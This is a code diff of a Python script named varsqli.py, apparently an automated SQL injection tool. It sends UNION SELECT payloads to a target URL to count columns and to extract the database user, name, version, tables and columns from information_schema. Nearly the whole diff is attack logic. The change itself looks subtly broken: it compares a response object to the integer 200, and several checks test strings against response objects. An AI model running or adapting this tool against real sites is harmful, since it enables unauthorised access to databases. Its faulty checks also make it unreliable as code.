@@ -143,141 +143,101 @@ if URL_TARGET:
                 result_2 = requests.get(URL_TARGET + payload_2)
                 query_vuln = "*%27"
                 check_vuln_1 = requests.get(URL_TARGET + query_vuln)
-                if "at line" in check_vuln_1.text:
-                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
-                    time.sleep(0.20)
-                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target May Be Vulnerable")
-                    if str(num_columns) in result_2.text:
-                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "numeric columns detected...")
+                if result_2 == 200:
+                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Server Accepted..")
+                    if "at line" in check_vuln_1.text:
+                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
                         time.sleep(0.20)
-                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "TESTING UNION SELECT ALL (MYSQL COMMAND)...")
-                        time.sleep(0.30)
-                        if "The used SELECT" in result_2.text:
-                            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Testing Payload {}".format(payload_2))
-                            time.sleep(0.30)
-                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Next Payloading...")
-                        else:
-                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Find Testing , Find ALL columns : {}".format(num_columns))
+                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target May Be Vulnerable")
+                        if str(num_columns) in result_2.text:
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "numeric columns detected...")
                             time.sleep(0.20)
-                            print("Parameter : 1")
-                            print("     Type : UNION SELECT ALL (Number Columns MySQL)")
-                            print("     Title : GETING columns number MySQL")
-                            print("")
-                            print("     Payload : {}".format(payload_2))
-                            print("")
-                            print("     URL : {}".format(URL_TARGET))
-                            print("")
-                            print("     LINK : {}{}".format(URL_TARGET, payload_2))
-                            print("")
-                            print("     Columns : : {}".format(num_columns))
-                            print("")
-                            if args.dbs:
-                                payload_3 = payload_2.replace("2", "user()")
-                                payload_4 = payload_2.replace("2", "database()")
-                                payload_5 = payload_2.replace("2", "version()")
-                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
-                                result_3 = requests.get(URL_TARGET + payload_3)
-                                if "The used SELECT" in result_3:
-                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
-                                    exit("Ending {}".format(end_time))
-        
-                                else:
-                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed User MySQL : {}{}".format(URL_TARGET, payload_3))
-                                    print("Username MySQL : ")
-                                    print("      Payload : {}".format(payload_3))
-                                    print("")
-                                    print("      URL : {}".format(URL_TARGET))
-                                    print("")
-                                    print("      LINK : {}{}".format(URL_TARGET, payload_3))
-                                    print("")
-
-                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get database name....")
-                                time.sleep(1)
-                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_4))
-                                result_4 = requests.get(URL_TARGET + payload_4)
-                                if "The used SELECT" in result_3:
-                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
-                                    exit("Ending {}".format(end_time))
-                                else:
-                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_4))
-                                    print("Database MySQL : ")
-                                    print("      Payload : {}".format(payload_4))
-                                    print("")
-                                    print("      URL : {}".format(URL_TARGET))
-                                    print("")
-                                    print("      LINK : {}{}".format(URL_TARGET, payload_4))
-                                    print("")
-                                    print("      Name Database 1 : information_schema")
-                                    print("")
-                                    
-                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get version MySQL....")
-                                time.sleep(1)
-                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_5))
-                                result_5 = requests.get(URL_TARGET + payload_5)
-                                if "The used SELECT" in result_3:
-                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
-                                    exit("Ending {}".format(end_time))
-                                else:
-                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_5))
-                                    print("version MySQL : ")
-                                    print("      Payload : {}".format(payload_5))
-                                    print("")
-                                    print("      URL : {}".format(URL_TARGET))
-                                    print("")
-                                    print("      LINK : {}{}".format(URL_TARGET, payload_5))
-                                    print("")
-
+                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "TESTING UNION SELECT ALL (MYSQL COMMAND)...")
+                            time.sleep(0.30)
+                            if "The used SELECT" in result_2.text:
+                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Testing Payload {}".format(payload_2))
+                                time.sleep(0.30)
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Next Payloading...")
                             else:
-                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-dbs")
+                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Find Testing , Find ALL columns : {}".format(num_columns))
+                                time.sleep(0.20)
+                                print("Parameter : 1")
+                                print("     Type : UNION SELECT ALL (Number Columns MySQL)")
+                                print("     Title : GETING columns number MySQL")
+                                print("")
+                                print("     Payload : {}".format(payload_2))
+                                print("")
+                                print("     URL : {}".format(URL_TARGET))
+                                print("")
+                                print("     LINK : {}{}".format(URL_TARGET, payload_2))
+                                print("")
+                                print("     Columns : : {}".format(num_columns))
+                                print("")
+                                if args.dbs:
+                                    payload_3 = payload_2.replace("2", "user()")
+                                    payload_4 = payload_2.replace("2", "database()")
+                                    payload_5 = payload_2.replace("2", "version()")
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
+                                    result_3 = requests.get(URL_TARGET + payload_3)
+                                    if "The used SELECT" in result_3:
+                                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                        exit("Ending {}".format(end_time))
+            
+                                    else:
+                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed User MySQL : {}{}".format(URL_TARGET, payload_3))
+                                        print("Username MySQL : ")
+                                        print("      Payload : {}".format(payload_3))
+                                        print("")
+                                        print("      URL : {}".format(URL_TARGET))
+                                        print("")
+                                        print("      LINK : {}{}".format(URL_TARGET, payload_3))
+                                        print("")
 
-                            if args.tab:
-                                query = payload_2.replace("2", "table_name")
-                                payload_6 = f"{query} From information_schema.tables"
-                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
-                                result_6 = requests.get(URL_TARGET, payload_6)
-                                if "The used SELECT" in result_6:
-                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
-                                    exit("Ending {}".format(end_time))
-                                else:
-                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
-                                    print("")
-                                    print("Database Tables Names MySQL : ")
-                                    print("      Payload : {}".format(payload_6))
-                                    print("")
-                                    print("      URL : {}".format(URL_TARGET))
-                                    print("")
-                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
-                                    print("")
-
-                            if args.col:
-                                query = payload_2.replace("2", "column_name")
-                                payload_6 = f"{query} From information_schema.tables"
-                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
-                                result_6 = requests.get(URL_TARGET, payload_6)
-                                if "The used SELECT" in result_6:
-                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
-                                    exit("Ending {}".format(end_time))
-                                else:
-                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
-                                    print("")
-                                    print("Database Tables Names MySQL : ")
-                                    print("      Payload : {}".format(payload_6))
-                                    print("")
-                                    print("      URL : {}".format(URL_TARGET))
-                                    print("")
-                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
-                                    print("")
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get database name....")
+                                    time.sleep(1)
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_4))
+                                    result_4 = requests.get(URL_TARGET + payload_4)
+                                    if "The used SELECT" in result_3:
+                                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                        exit("Ending {}".format(end_time))
+                                    else:
+                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_4))
+                                        print("Database MySQL : ")
+                                        print("      Payload : {}".format(payload_4))
+                                        print("")
+                                        print("      URL : {}".format(URL_TARGET))
+                                        print("")
+                                        print("      LINK : {}{}".format(URL_TARGET, payload_4))
+                                        print("")
+                                        print("      Name Database 1 : information_schema")
+                                        print("")
                                         
-                            
-                            if args.tables:
-                                if args.name_db:
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get version MySQL....")
+                                    time.sleep(1)
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_5))
+                                    result_5 = requests.get(URL_TARGET + payload_5)
+                                    if "The used SELECT" in result_3:
+                                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                        exit("Ending {}".format(end_time))
+                                    else:
+                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_5))
+                                        print("version MySQL : ")
+                                        print("      Payload : {}".format(payload_5))
+                                        print("")
+                                        print("      URL : {}".format(URL_TARGET))
+                                        print("")
+                                        print("      LINK : {}{}".format(URL_TARGET, payload_5))
+                                        print("")
+
+                                else:
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-dbs")
+
+                                if args.tab:
                                     query = payload_2.replace("2", "table_name")
-                                    payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
+                                    payload_6 = f"{query} From information_schema.tables"
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                     result_6 = requests.get(URL_TARGET, payload_6)
                                     if "The used SELECT" in result_6:
@@ -294,40 +254,86 @@ if URL_TARGET:
                                         print("")
                                         print("      LINK : {}{}".format(URL_TARGET, payload_6))
                                         print("")
-                                        
-                                else:
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-tables -T < Name DB >")
 
-                            if args.column:
-                                if args.name_column:
-                                    query_1 = payload_2.replace("2", "column_name")
-                                    payload_7 = f"{query_1} From information_schema.columns where table_schema = '{args.name_column}'"
-                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_7))
-                                    result_6 = requests.get(URL_TARGET, payload_7)
+                                if args.col:
+                                    query = payload_2.replace("2", "column_name")
+                                    payload_6 = f"{query} From information_schema.tables"
+                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
+                                    result_6 = requests.get(URL_TARGET, payload_6)
                                     if "The used SELECT" in result_6:
-                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
-                                        exit()
+                                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                        exit("Ending {}".format(end_time))
                                     else:
-                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_7))
-                                        print("Database Name Columns DBMS Tables MySQL : ")
-                                        print("      Payload : {}".format(payload_7))
+                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
+                                        print("")
+                                        print("Database Tables Names MySQL : ")
+                                        print("      Payload : {}".format(payload_6))
                                         print("")
                                         print("      URL : {}".format(URL_TARGET))
                                         print("")
-                                        print("      LINK : {}{}".format(URL_TARGET, payload_7))
+                                        print("      LINK : {}{}".format(URL_TARGET, payload_6))
                                         print("")
-                                        exit()
-                                else:
-                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
-                                    print("Ending {}".format(end_time))          
+                                            
+                                
+                                if args.tables:
+                                    if args.name_db:
+                                        query = payload_2.replace("2", "table_name")
+                                        payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
+                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
+                                        result_6 = requests.get(URL_TARGET, payload_6)
+                                        if "The used SELECT" in result_6:
+                                            end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                            exit("Ending {}".format(end_time))
+                                        else:
+                                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
+                                            print("")
+                                            print("Database Tables Names MySQL : ")
+                                            print("      Payload : {}".format(payload_6))
+                                            print("")
+                                            print("      URL : {}".format(URL_TARGET))
+                                            print("")
+                                            print("      LINK : {}{}".format(URL_TARGET, payload_6))
+                                            print("")
+                                            
+                                    else:
+                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-tables -T < Name DB >")
+
+                                if args.column:
+                                    if args.name_column:
+                                        query_1 = payload_2.replace("2", "column_name")
+                                        payload_7 = f"{query_1} From information_schema.columns where table_schema = '{args.name_column}'"
+                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_7))
+                                        result_6 = requests.get(URL_TARGET, payload_7)
+                                        if "The used SELECT" in result_6:
+                                            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
+                                            exit()
+                                        else:
+                                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_7))
+                                            print("Database Name Columns DBMS Tables MySQL : ")
+                                            print("      Payload : {}".format(payload_7))
+                                            print("")
+                                            print("      URL : {}".format(URL_TARGET))
+                                            print("")
+                                            print("      LINK : {}{}".format(URL_TARGET, payload_7))
+                                            print("")
+                                            exit()
+                                    else:
+                                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                        print("Ending {}".format(end_time))          
+                        else:
+                            end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed Get Columns Tables")
+                            exit("Ending {}".format(end_time))
                     else:
                         end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed Get Columns Tables")
+                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                         exit("Ending {}".format(end_time))
                 else:
                     end_time = datetime.datetime.now().strftime("%H:%M:%S")
-                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "not Accept")
                     exit("Ending {}".format(end_time))
         else:
             end_time = datetime.datetime.now().strftime("%H:%M:%S")
